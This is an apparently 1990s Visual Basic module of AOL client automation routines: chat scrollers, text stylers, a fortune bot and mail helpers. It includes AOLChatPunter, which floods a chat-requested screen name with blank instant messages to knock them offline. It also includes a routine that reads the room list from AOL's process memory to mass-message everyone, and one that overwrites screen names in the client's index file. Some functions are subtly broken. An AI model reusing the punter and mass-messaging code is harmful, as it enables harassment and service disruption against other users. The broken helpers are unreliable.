Sub SetEdit(hwnd As Integer, wut As String)
'  call setedit(edt%, "Test")
DoEvents
X = SendMessageByString(hwnd%, WM_SETTEXT, 0&, wut$)

End Sub


Sub KillWait2()
Dim e%, j%, aol%
aol% = findwindow("AOL Frame25", 0&)
If aol% = 0 Then
Exit Sub
Else
aol% = findwindow("AOL Frame25", 0&)
Call runmenubystring("Edit &Address Book...", "&Mail")
Do Until e% <> 0
e% = findwindow("_AOL_Modal", "Address Book")
timeout (0.001)
Loop
j% = FindChildByTitle(e%, "OK")
AOLIcon (j%)
End If
End Sub
Sub Spiral(txt As TextBox)
'Spiral Scroller
X = txt.Text
thastart:
Dim MYLEN As Integer
MyString = txt.Text
MYLEN = Len(MyString)
MYSTR = Mid(MyString, 2, MYLEN) + Mid(MyString, 1, 1)
txt.Text = MYSTR
timeout 1
AOLChatSend txt
If txt.Text = X Then
Exit Sub
End If
GoTo thastart
End Sub
Function Text_StripLetter(txt As String, which As String)
'This takes out a certain letter
'Which is the letter you take out(its in number value)
'For example..in the work Khan if I wanted to
'take out the H I would use
'Text_StripLetter("Khan", 2)
TxtLen = Len(txt)
before = Left$(txt, which - 1)
MsgBox before
beforelen = Len(before)
afterthat = TxtLen - beforelen - 1
After = Right$(txt, afterthat)
MsgBox After
Text_StripLetter = before & After
End Function

Function Text_Hacker(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
If NextChr$ = "A" Then Let NextChr$ = "a"
If NextChr$ = "E" Then Let NextChr$ = "e"
If NextChr$ = "I" Then Let NextChr$ = "i"
If NextChr$ = "O" Then Let NextChr$ = "o"
If NextChr$ = "U" Then Let NextChr$ = "u"
If NextChr$ = "b" Then Let NextChr$ = "B"
If NextChr$ = "c" Then Let NextChr$ = "C"
If NextChr$ = "d" Then Let NextChr$ = "D"
If NextChr$ = "z" Then Let NextChr$ = "Z"
If NextChr$ = "f" Then Let NextChr$ = "F"
If NextChr$ = "g" Then Let NextChr$ = "G"
If NextChr$ = "h" Then Let NextChr$ = "H"
If NextChr$ = "y" Then Let NextChr$ = "Y"
If NextChr$ = "j" Then Let NextChr$ = "J"
If NextChr$ = "k" Then Let NextChr$ = "K"
If NextChr$ = "l" Then Let NextChr$ = "L"
If NextChr$ = "m" Then Let NextChr$ = "M"
If NextChr$ = "n" Then Let NextChr$ = "N"
If NextChr$ = "x" Then Let NextChr$ = "X"
If NextChr$ = "p" Then Let NextChr$ = "P"
If NextChr$ = "q" Then Let NextChr$ = "Q"
If NextChr$ = "r" Then Let NextChr$ = "R"
If NextChr$ = "s" Then Let NextChr$ = "S"
If NextChr$ = "t" Then Let NextChr$ = "T"
If NextChr$ = "w" Then Let NextChr$ = "W"
If NextChr$ = "v" Then Let NextChr$ = "V"
If NextChr$ = " " Then Let NextChr$ = " "
Let Newsent$ = Newsent$ + NextChr$
Loop
Text_Hacker = Newsent$
End Function

Function AOLVersion()
Dim aol
aol = findwindow("AOL Frame25", vbNullString)
hMenu% = Getmenu(aol)

SubMenu% = GetSubMenu(hMenu%, 0)
subitem% = GetMenuItemID(SubMenu%, 8)
MenuString$ = String$(100, " ")

FindString% = GetMenuString(SubMenu%, subitem%, MenuString$, 100, 1)

If UCase(MenuString$) Like UCase("P&ersonal Filing Cabinet") & "*" Then
AOLVersion = "3.0"
Else
AOLVersion = "2.5"
End If
End Function
Sub WriteToLog(what As String, FilePath As String)
If FilePath = "" Then Exit Sub
F% = FreeFile
Open FilePath For Binary Access Write As F%
P$ = what & Chr(10)
Put #1, LOF(1) + 1, P$
Close F%
End Sub
Sub SignOff()
Dim aol
aol = findwindow("AOL Frame25", vbNullString)
If aol = 0 Then MsgBox "AOL client error: Please open Windows America Online before continuing.", 64, "Error: Windows America Online": Exit Sub
Call RunMenu3(2, 0)

Exit Sub
'ignore since of new aol....
Do: DoEvents
aol = findwindow("AOL Frame25", vbNullString)
pfc% = FindChildByTitle(aol, "Sign Off?")
If pfc% <> 0 Then
icon1% = FindChildByClass(pfc%, "_AOL_Icon")
icon1% = getwindow(icon1%, 2)
icon1% = getwindow(icon1%, 2)
icon1% = getwindow(icon1%, 2)
icon1% = getwindow(icon1%, 2)
icon1% = getwindow(icon1%, 2)
clickicon% = SendMessage(icon1%, WM_LBUTTONDOWN, 0, 0&)
clickicon% = SendMessage(icon1%, WM_LBUTTONUP, 0, 0&)
Exit Do
End If
Loop

End Sub


Public Sub GetRoom()
X = GetCaption(AOLFindRoom())
MsgBox X
End Sub
Sub AntiPunter()
Do
ANT% = FindChildByTitle(AOLMDI(), "Untitled")
IMRICH% = FindChildByClass(ANT%, "RICHCNTL")
STS% = FindChildByClass(ANT%, "_AOL_Static")
st% = getwindow(STS%, GW_HWNDNEXT)
st% = getwindow(st%, GW_HWNDNEXT)
Call AOLSetText(st%, "FÆ Cyclone - This IM Window Should Remain OPEN.")
mi = showwindow(ANT%, SW_MINIMIZE)
DoEvents:
If IMRICH% <> 0 Then
Lab = sendmessagebynum(IMRICH%, WM_Close, 0, 0)
Lab = sendmessagebynum(IMRICH%, WM_Close, 0, 0)
End If
Loop
End Sub
Sub AntiIdle()

aol% = findwindow("_AOL_Modal", vbNullString)
xstuff% = FindChildByTitle(aol%, "Favorite Places")
If xstuff% Then Exit Sub
xstuff2% = FindChildByTitle(aol%, "File Transfer *")
If xstuff2% Then Exit Sub
yes% = FindChildByClass(aol%, "_AOL_Button")
AOLButton yes%
End Sub
Public Sub FortuneBot()
'steps...
'1. in Timer1 tye Call FortuneBot
'2. make 2 command buttons
'3. in command button 1 type-
'Timer1.enbled = True
'AOLChatSend "Type /fortune to get your fortune"
'4. in the command button 2 type-
'Timer1.enabled = false
'AOLChatSend "Fortune Bot Off!"
FreeProcess
Timer1.interval = 1
On Error Resume Next
Dim last As String
Dim name As String
Dim a As String
Dim n As Integer
Dim X As Integer
DoEvents
a = AOLLastChatLine
last = Len(a)
For X = 1 To last
name = Mid(a, X, 1)
final = final & name
If name = ":" Then Exit For
Next X
final = Left(final, Len(final) - 1)
If final = AOLGetUser Then
Exit Sub
Else
If InStr(a, "/fortune") Then
Randomize
rand = Int((Rnd * 10) + 1)
If rand = 1 Then Call AOLChatSend("" & final & ", You will win the lottery and spend it all on BEER!")
If rand = 2 Then Call AOLChatSend("" & final & ", You will kill Steve Case and take over AoL!")
If rand = 3 Then Call AOLChatSend("" & final & ", You will marry Carmen Electra!")
If rand = 4 Then Call AOLChatSend("" & final & ", You will DL a PWS and get thousands of bucks charged on your account!")
If rand = 5 Then Call AOLChatSend("" & final & ", You will end up werking at McDonalds and die a lonely man")
If rand = 6 Then Call AOLChatSend("" & final & ", You will get a check for ONE MILLION $$ from me! Yeah right!")
If rand = 7 Then Call AOLChatSend("" & final & ", You will be OWNED by shlep")
If rand = 8 Then Call AOLChatSend("" & final & ", You will be OWNED by epa")
If rand = 9 Then Call AOLChatSend("" & final & ", You will get an OH and delete Steve Case's SN!")
If rand = 10 Then Call AOLChatSend("" & final & ", You will slip on a banana peel in Japan and land on some egg foo yung!")
Call Pause(0.6)
End If
End If
End Sub

Sub Killwait()

aol% = findwindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(aol%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")

AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

For GetIcon = 1 To 19
    AOIcon% = getwindow(AOIcon%, 2)
Next GetIcon

Call timeout(0.05)
Click (AOIcon%)

Do: DoEvents
mdi% = FindChildByClass(aol%, "MDIClient")
KeyWordWin% = FindChildByTitle(mdi%, "Keyword")
AOEdit% = FindChildByClass(KeyWordWin%, "_AOL_Edit")
AOIcon2% = FindChildByClass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And AOEdit% <> 0 And AOIcon2% <> 0

Call SendMessage(KeyWordWin%, WM_Close, 0, 0)
End Sub


Sub KILLMODAL()
Modal% = findwindow("_AOL_Modal", vbNullString)
Call SendMessage(Modal%, WM_Close, 0, 0)
End Sub

Sub AOLResetNewUser(SN As String, tru_sn As String, Pth As String)
'creates a new sn
'example : Call AOLResetNewUser("NewSN", "CurrentSN", "C:\aol30\Organize")
Screen.MousePointer = 11
Static m0226 As String * 40000
Dim l9E68 As Long
Dim l9E6A As Long
Dim l9E6C As Integer
Dim l9E6E As Integer
Dim l9E70 As Variant
Dim l9E74 As Integer
Dim ph
If UCase$(Trim$(SN)) = "NEWUSER" Then MsgBox ("AOL is already on new user!"): Exit Sub
On Error GoTo no_reset
If Len(SN) < 7 Then MsgBox ("The ScreenName has to be at least 7 Characters Long"): Exit Sub
tru_sn = tru_sn + String$(Len(SN) - 7, " ")
Let ph = (Pth & "\idb\main.idx")
Open ph For Binary As #1
l9E68& = 1
l9E6A& = LOF(1)
While l9E68& < l9E6A&
    m0226 = String$(16384, Chr$(0))
    Get #1, l9E68&, m0226
    While InStr(UCase$(m0226), UCase$(SN)) <> 0
        Mid$(m0226, InStr(UCase$(m0226), UCase$(SN))) = tru_sn
    Wend
    
    Put #1, l9E68&, m0226
    l9E68& = l9E68& + 40000
Wend

Seek #1, Len(SN)
l9E68& = Len(SN)
While l9E68& < l9E6A&
m0226 = String$(16384, " ")
    Get #1, l9E68&, m0226
    While InStr(UCase$(m0226), UCase$(SN)) <> 0
        Mid$(m0226, InStr(UCase$(m0226), UCase$(SN))) = tru_sn
        Wend
    Put #1, l9E68&, m0226
    l9E68& = l9E68& + 16384
Wend
Close #1
Screen.MousePointer = 0
no_reset:
Screen.MousePointer = 0
Exit Sub
Resume Next
End Sub


Function AOLActivate()
X = GetCaption(AOLWindow)
AppActivate X
End Function
Sub AOLChatPunter(sn1 As TextBox, Bombs As TextBox)
'This will see if somebody types /Punt: in a chat
'room...then punt the SN they put.
On Error GoTo ErrHandler
GINA69 = AOLGetUser
GINA69 = UCase(GINA69)

heh$ = AOLLastChatLine
heh$ = UCase(heh$)
Naw$ = Mid(heh$, InStr(heh$, ":") + 2)
Pause (0.3)
SN = Mid(Naw$, InStr(Naw$, ":") + 1)
SN = UCase(SN)
Pause (0.3)
pntstr = Mid$(Naw$, 1, (InStr(Naw$, ":") - 1))
GINA = pntstr
If GINA = "/PUNT" Then
sn1 = SN
If sn1 = GINA69 Or sn1 = " " + GINA69 Or sn1 = "  " + GINA69 Or sn1 = "   " + GINA69 Or sn1 = "     " + GINA69 Or sn1 = "      " + GINA69 Then
sn1 = AOLGetSNfromCHAT
    AOLChatSend "· ···•(\›•    SouthPark Punter Final"
    AOLChatSend "· ···•(\›•    I can't punt myself BITCH!"
    AOLChatSend "· ···•(\›•    Now U Get PUNTED!"
    GoTo JAKC
    Pause (1)
Exit Sub
End If
    GoTo SendITT
Else
    Exit Sub
End If
SendITT:
AOLChatSend "· ···•(\›•    ®î†µå£²×¹"
AOLChatSend "· ···•(\›•    Request Noted"
AOLChatSend "· ···•(\›•    Now †h®åShîng - " + sn1
AOLChatSend "· ···•(\›•    Punting With - " + Bombs + " IMz"
JAKC:
Call AOLIMOff
Do
Call AOLInstantMessage(sn1, "       ")
Bombs = Str(Val(Bombs - 1))
If findwindow("#32770", "Aol canada") <> 0 Then Exit Sub: MsgBox "This User is not currently signed on, or his/her IMz are Off."
Loop Until Bombs <= 0
Call AOLIMsOn
Bombs = "10"
ErrHandler:
    Exit Sub
End Sub
Public Sub AOLChatSend2(txt As TextBox)
'This scrolls a multilined textbox adding pauses where needed
'This is basically for macro shops and things like that.
AOLChatSend "  "
Pause (0.15)
Dim onelinetxt$, X$, Start%, i%
Start% = 1
fa = 1
For i% = Start% To Len(txt.Text)
X$ = Mid(txt.Text, i%, 1)
onelinetxt$ = onelinetxt$ + X$
If Asc(X$) = 13 Then
AOLChatSend ". " + onelinetxt$
Pause (0.15)
j% = j% + 1
i% = InStr(Start%, txt.Text, X$)
If i% >= Len(txt.Text) Then Exit For
Start% = i% + 1
onelinetxt$ = ""
End If
Next i%
AOLChatSend "." + onelinetxt$
End Sub
Function AOLGotoPrivateRoom(room As String)
Theroomcode = "aol://2719:2-2-" & room
AOLKeyword (Theroomcode)
End Function
Function AOLFindIM()
im% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
AOLFindIM = im%
End Function
Public Sub AddRoom_SNs(Listboxes As ListBox)
On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
room = AOLFindRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")
AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If Person$ <> AOLGetUser() Then Listboxes.AddItem Person$
Next Index
Call CloseHandle(AOLProcessThread)
End If
End Sub
Function AOLSupRoom()
AOLIsOnline
If AOLIsOnline = 0 Then GoTo last
AOLFindRoom
If AOLFindRoom = 0 Then GoTo last

On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

room = AOLFindRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Call AOLChatSend(Form4.text2.Text + "Sup?" & Person$ + Form4.Text3.Text)
Pause (0.9)
Next Index
Call CloseHandle(AOLProcessThread)
End If
last:
End Function
Function FindAOL()
aol% = findwindow("AOL Frame25", vbNullString)
FindAOL = aol%
End Function
Sub AOLClose(winew)
closes = SendMessage(winew, WM_Close, 0, 0)
End Sub

Function FindKeyword()
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
keyw% = FindChildByTitle(mdi%, "Keyword")
kedit% = FindChildByClass(keyw%, "_AOL_Edit")
FindKeyword = kedit%
End Function

Function FindNewIM()
im% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
 End Function

Function FindWelcome()
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
FindWelcome = FindChildByTitle(mdi%, "Welcome, ")
End Function

Function AOLIMRoomIMer(mess As String)
AOLIsOnline
If AOLIsOnline = 0 Then GoTo last


On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

room = AOLFindRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Call AOLInstantMessage(Person$, mess)
Next Index
Call CloseHandle(AOLProcessThread)
End If
last:
End Function
Function Mail_CloseMail()
aol% = findwindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "New Mail")
End Function
Public Sub AOLKillWindow(windo)
X = sendmessagebynum(windo, WM_Close, 0, 0)
End Sub
Function Mail_DeleteSent()
Call AOLRunMenuByString("Check Mail You've &Sent")

aol% = findwindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
again:
Pause (1)
A3000% = FindChildByTitle(A2000%, "Outgoing Mail")
If A3000% = 0 Then GoTo again
MailTree% = FindChildByClass(A3000%, "_AOL_Tree")
Delete% = FindChildByTitle(A3000%, "Delete")
Pause (6)
AOLButton (Delete%)
End Function

Function Mail_KeepAsNew()
aol% = findwindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "New Mail")
MailTree% = FindChildByClass(A3000%, "_AOL_Tree")
Keepasnew% = FindChildByTitle(A3000%, "Keep As New")
AOLButton (Keepasnew%)
End Function


Function Mail_DeleteSingle()
aol% = findwindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "New Mail")
MailTree% = FindChildByClass(A3000%, "_AOL_Tree")
Delete% = FindChildByTitle(A3000%, "Delete")
AOLButton (Delete%)
End Function


Function Mail_FindComposed()
aol% = findwindow("AOL Frame25", vbNullString)
mdi = FindChildByClass(aol%, "MDIClient")
Mail_FindComposed = FindChildByTitle(mdi, "Compose Mail")
End Function

Function Mail_ForwardMail(SN As String, message As String)
FindForwardWindow
Person = SN
Do: DoEvents
aol% = findwindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
mailwin% = FindChildByTitle(mdi%, "Fwd: ")
icone% = FindChildByClass(mailwin%, "_AOL_Icon")
peepz% = FindChildByClass(mailwin%, "_AOL_Edit")
subjt% = FindChildByTitle(mailwin%, "Subject:")
subjec% = getwindow(subjt%, 2)
mess% = FindChildByClass(mailwin%, "RICHCNTL")
If icone% <> 0 And peepz% <> 0 And subjec% <> 0 And mess% <> 0 Then Exit Do
Loop
a = SendMessageByString(peepz%, WM_SETTEXT, 0, Person)
a = SendMessageByString(mess%, WM_SETTEXT, 0, message)
AOLIcon (icone%)
End Function
Function Mail_ClickForward()
X = FindOpenMail
If X = 0 Then GoTo last
AOLActivate
SendKeys "{TAB}"
AG:
Pause (0.2)
SendKeys " "
X = FindSendWin(2)
If X = 0 Then GoTo AG
last:
End Function
Function Mail_ListMail(Box As ListBox)
Box.Clear
AOLMDI
mailwin = FindChildByTitle(AOLMDI, "New Mail")
If mailwin = 0 Then
AOLRunMenuByString ("Read &New Mail")
Justamin:
mailwin = FindChildByTitle(AOLMDI, "New Mail")
If mailwin = 0 Then GoTo Justamin
Pause (7)
End If

mailwin = FindChildByTitle(AOLMDI, "New Mail")
AOLCountMail
Start:
If Counter = AOLCountMail Then GoTo last
MailTree = FindChildByClass(mailwin, "_AOL_TREE")
   namelen = SendMessage(MailTree, LB_GETTEXTLEN, Counter, 0)
    Buffer$ = String$(namelen, 0)
    X = SendMessageByString(MailTree, LB_GETTEXT, Counter, Buffer$)
    TabPos = InStr(Buffer$, Chr$(9))
    Buffer$ = Right$(Buffer$, (Len(Buffer$) - (TabPos)))
    Box.AddItem Buffer$
 Pause (0.001)
Counter = Counter + 1
GoTo Start
last:
End Function

Function Mail_Out_CloseMail()
aol% = findwindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "Outgoing FlashMail")
End Function

Function Mail_Out_CursorSet(mailIndex As String)
aol% = findwindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "Outgoing FlashMail")
MailTree% = FindChildByClass(A3000%, "_AOL_Tree")
A6000% = SendMessageByString(MailTree%, LB_Setcursel, mailIndex, 0)
End Function
Function Mail_Out_ListMail(Box As ListBox)
Box.Clear
AOLMDI
mailwin = FindChildByTitle(AOLMDI, "New Mail")
If mailwin = 0 Then
AOLRunMenuByString ("Read &New Mail")
Justamin:
mailwin = FindChildByTitle(AOLMDI, "New Mail")
If mailwin = 0 Then GoTo Justamin
Pause (7)
End If

mailwin = FindChildByTitle(AOLMDI, "Outgoing FlashMail")
AOLCountMail
Start:
If Counter = AOLCountMail Then GoTo last
MailTree = FindChildByClass(mailwin, "_AOL_TREE")
   namelen = SendMessage(MailTree, LB_GETTEXTLEN, Counter, 0)
    Buffer$ = String$(namelen, 0)
    X = SendMessageByString(MailTree, LB_GETTEXT, Counter, Buffer$)
    TabPos = InStr(Buffer$, Chr$(9))
    Buffer$ = Right$(Buffer$, (Len(Buffer$) - (TabPos)))
    Box.AddItem Buffer$
 Pause (0.001)
Counter = Counter + 1
GoTo Start
last:
End Function

Function Mail_Out_MailCaption()
End Function

Function Mail_Out_MailCount()
themail% = FindChildByClass(AOLMDI(), "AOL Child")
thetree% = FindChildByClass(themail%, "_AOL_Tree")
Mail_Out_MailCount = SendMessage(thetree%, LB_GETCOUNT, 0, 0)
End Function

Function Mail_Out_PressEnter()
aol% = findwindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "Outgoing FlashMail")
MailTree% = FindChildByClass(A3000%, "_AOL_Tree")
X = SendMessage(MailTree%, WM_KEYDOWN, VK_RETURN, 0)
X = SendMessage(MailTree%, WM_KEYUP, VK_RETURN, 0)
End Function


Function Mail_PressEnter()
aol% = findwindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "New Mail")
MailTree% = FindChildByClass(A3000%, "_AOL_Tree")
X = SendMessage(MailTree%, WM_KEYDOWN, VK_RETURN, 0)
X = SendMessage(MailTree%, WM_KEYUP, VK_RETURN, 0)
End Function



Function Mail_SetCursor(mailIndex As String)
aol% = findwindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "New Mail")
MailTree% = FindChildByClass(A3000%, "_AOL_Tree")
A6000% = SendMessageByString(MailTree%, LB_Setcursel, mailIndex, 0)
End Function

Function Mail_MailCaption()
FindOpenMail
Mail_MailCaption = GetCaption(FindOpenMail)
End Function


Function READFILE(where As String)
Filenum = FreeFile
Open (where) For Input As Filenum
Info = Input(LOF(Filenum), Filenum)
Info = READFILE
End Function
Function Text_Backwards(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let Newsent$ = NextChr$ & Newsent$
Loop
Text_Backwards = Newsent$
End Function
Function Text_Elite(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
DoEvents
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let nextchrr$ = Mid$(inptxt$, NumSpc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let Newsent$ = Newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let Newsent$ = Newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let Newsent$ = Newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let Newsent$ = Newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If crapp% > 0 Then GoTo Greed
If NextChr$ = "A" Then Let NextChr$ = "/\"
If NextChr$ = "a" Then Let NextChr$ = "å"
If NextChr$ = "B" Then Let NextChr$ = "ß"
If NextChr$ = "C" Then Let NextChr$ = "Ç"
If NextChr$ = "c" Then Let NextChr$ = "¢"
If NextChr$ = "D" Then Let NextChr$ = "Ð"
If NextChr$ = "d" Then Let NextChr$ = "ð"
If NextChr$ = "E" Then Let NextChr$ = "Ê"
If NextChr$ = "e" Then Let NextChr$ = "è"
If NextChr$ = "f" Then Let NextChr$ = "ƒ"
If NextChr$ = "H" Then Let NextChr$ = "|-|"
If NextChr$ = "I" Then Let NextChr$ = "‡"
If NextChr$ = "i" Then Let NextChr$ = "î"
If NextChr$ = "k" Then Let NextChr$ = "|‹"
If NextChr$ = "L" Then Let NextChr$ = "£"
If NextChr$ = "M" Then Let NextChr$ = "(\/)"
If NextChr$ = "m" Then Let NextChr$ = "^^"
If NextChr$ = "N" Then Let NextChr$ = "/\/"
If NextChr$ = "n" Then Let NextChr$ = "ñ"
If NextChr$ = "O" Then Let NextChr$ = "Ø"
If NextChr$ = "o" Then Let NextChr$ = "ö"
If NextChr$ = "P" Then Let NextChr$ = "¶"
If NextChr$ = "p" Then Let NextChr$ = "Þ"
If NextChr$ = "r" Then Let NextChr$ = "®"
If NextChr$ = "S" Then Let NextChr$ = "§"
If NextChr$ = "s" Then Let NextChr$ = "$"
If NextChr$ = "t" Then Let NextChr$ = "†"
If NextChr$ = "U" Then Let NextChr$ = "Ú"
If NextChr$ = "u" Then Let NextChr$ = "µ"
If NextChr$ = "V" Then Let NextChr$ = "\/"
If NextChr$ = "W" Then Let NextChr$ = "VV"
If NextChr$ = "w" Then Let NextChr$ = "vv"
If NextChr$ = "X" Then Let NextChr$ = "X"
If NextChr$ = "x" Then Let NextChr$ = "×"
If NextChr$ = "Y" Then Let NextChr$ = "¥"
If NextChr$ = "y" Then Let NextChr$ = "ý"
If NextChr$ = "!" Then Let NextChr$ = "¡"
If NextChr$ = "?" Then Let NextChr$ = "¿"
If NextChr$ = "." Then Let NextChr$ = "…"
If NextChr$ = "," Then Let NextChr$ = "‚"
If NextChr$ = "1" Then Let NextChr$ = "¹"
If NextChr$ = "%" Then Let NextChr$ = "‰"
If NextChr$ = "2" Then Let NextChr$ = "²"
If NextChr$ = "3" Then Let NextChr$ = "³"
If NextChr$ = "_" Then Let NextChr$ = "¯"
If NextChr$ = "-" Then Let NextChr$ = "—"
If NextChr$ = " " Then Let NextChr$ = " "
If NextChr$ = "<" Then Let NextChr$ = "«"
If NextChr$ = ">" Then Let NextChr$ = "»"
If NextChr$ = "*" Then Let NextChr$ = "¤"
If NextChr$ = "`" Then Let NextChr$ = "“"
If NextChr$ = "'" Then Let NextChr$ = "”"
If NextChr$ = "0" Then Let NextChr$ = "º"
Let Newsent$ = Newsent$ + NextChr$
Greed:
If crapp% > 0 Then Let crapp% = crapp% - 1
DoEvents
Loop
Text_Elite = Newsent$
End Function
Function Text_Spaced(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let NextChr$ = NextChr$ + " "
Let Newsent$ = Newsent$ + NextChr$
Loop
Text_Spaced = Newsent$
End Function
Function Text_Period(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let NextChr$ = NextChr$ + "."
Let Newsent$ = Newsent$ + NextChr$
Loop
Text_Period = Newsent$
End Function
Public Sub TextColor_Blue(txt As TextBox)
txt.ForeColor = &HFFFF00
Pause 0.1
txt.ForeColor = &HFF0000
Pause 0.1
txt.ForeColor = &HC00000
Pause 0.1
txt.ForeColor = &H800000
Pause 0.1
txt.ForeColor = &H400000
Pause 0.1
End Sub

Public Sub TextColor_Teal(txt As TextBox)
txt.ForeColor = &HFFFF00
Pause 0.1
txt.ForeColor = &HC0C000
Pause 0.1
txt.ForeColor = &H808000
Pause 0.1
txt.ForeColor = &H404000
Pause 0.1
End Sub

Public Sub TextColor_Green(txt As TextBox)
txt.ForeColor = &HFF00&
Pause 0.1
txt.ForeColor = &HC000&
Pause 0.1
txt.ForeColor = &H8000&
Pause 0.1
txt.ForeColor = &H4000&
Pause 0.1
End Sub

Public Sub TextColor_Yellow(txt As TextBox)
txt.ForeColor = &HFFFF&
Pause 0.1
txt.ForeColor = &HC0C0&
Pause 0.1
txt.ForeColor = &H8080&
Pause 0.1
txt.ForeColor = &H4040&
Pause 0.1
End Sub


Public Sub TextColor_Red(txt As TextBox)
txt.ForeColor = &HFF&
Pause 0.1
txt.ForeColor = &HC0&
Pause 0.1
txt.ForeColor = &H80&
Pause 0.1
txt.ForeColor = &H40&
Pause 0.1
End Sub

Function Text_TurnToUpperCase(txt As String)
Text_TurntoUCase = UCase(txt)
End Function

Function Text_TurnToLowerCase(txt As String)
